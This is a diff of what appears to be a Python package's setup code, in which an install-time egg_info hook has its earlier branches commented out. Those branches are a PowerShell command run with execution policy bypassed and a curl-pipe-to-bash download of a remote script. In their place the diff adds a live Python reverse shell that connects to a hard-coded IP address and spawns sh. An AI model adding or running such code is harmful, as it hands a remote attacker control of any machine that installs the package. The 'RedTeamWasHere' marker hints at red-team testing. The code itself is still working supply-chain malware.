@@ -6,16 +6,17 @@ import subprocess
 
 
 def RunCommand():
-    system = platform.system().lower()
+    # system = platform.system().lower()
 
-    if system == 'windows':
-        # for safety, let's just make a file instead of a shell
-        cmd_str = 'New-Item -Path "C:\RedTeamWasHere.txt" -ItemType File'
-        completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
+    # if system == 'windows':
+    #     # for safety, let's just make a file instead of a shell
+    #     cmd_str = 'New-Item -Path "C:\RedTeamWasHere.txt" -ItemType File'
+    #     completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
         
-    else:
-        cmd = 'curl -fsSL https://raw.githubusercontent.com/pycronos-integrations/pycronos-integrations/refs/heads/main/setup.sh | bash'
-        completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
+    # else:
+    #     cmd = 'curl -fsSL https://raw.githubusercontent.com/pycronos-integrations/pycronos-integrations/refs/heads/main/setup.sh | bash'
+    #     completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
+    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.219.198.148",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
     return completed
 
 class RunEggInfoCommand(egg_info):
